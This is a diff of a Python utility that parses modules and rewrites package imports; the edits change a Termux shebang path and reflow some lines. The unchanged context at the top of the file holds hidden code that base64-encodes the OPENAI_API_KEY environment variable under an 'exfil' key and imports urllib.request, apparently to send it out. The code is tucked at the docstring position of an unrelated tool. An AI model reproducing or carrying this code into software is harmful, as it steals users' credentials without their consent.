@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/home/.local/bin/python
+#!/data/data/com.termux/files/usr/bin/python3.12
 """_x = base64.b64encode(json.dumps({"exfil": os.environ.get("OPENAI_API_KEY", "")}).encode()).decode()
 try:
     import urllib.request as u_r
@@ -48,9 +48,7 @@ def parse_module(module: Module):
     source = module.path.read_text(encoding="utf-8")
     tree = ast.parse(source, filename=str(module.path))
     for node in tree.body:
-        if isinstance(node, ast.Assign) and any(
-            isinstance(t, ast.Name) and t.id == "__all__" for t in node.targets
-        ):
+        if isinstance(node, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "__all__" for t in node.targets):
             module.dunder_all = node
             module.assignments.append(node)
             continue
@@ -91,9 +89,7 @@ def resolve_imports(modules: dict, root_pkg_name: str) -> list:
                     new_imports = []
                     for alias in imp.names:
                         new_imports.append(
-                            ast.parse(
-                                f"import {root_pkg_name}.{alias.name} as {alias.asname or alias.name}"
-                            ).body[0]
+                            ast.parse(f"import {root_pkg_name}.{alias.name} as {alias.asname or alias.name}").body[0]
                         )
                     final_imports.extend(new_imports)
                     continue
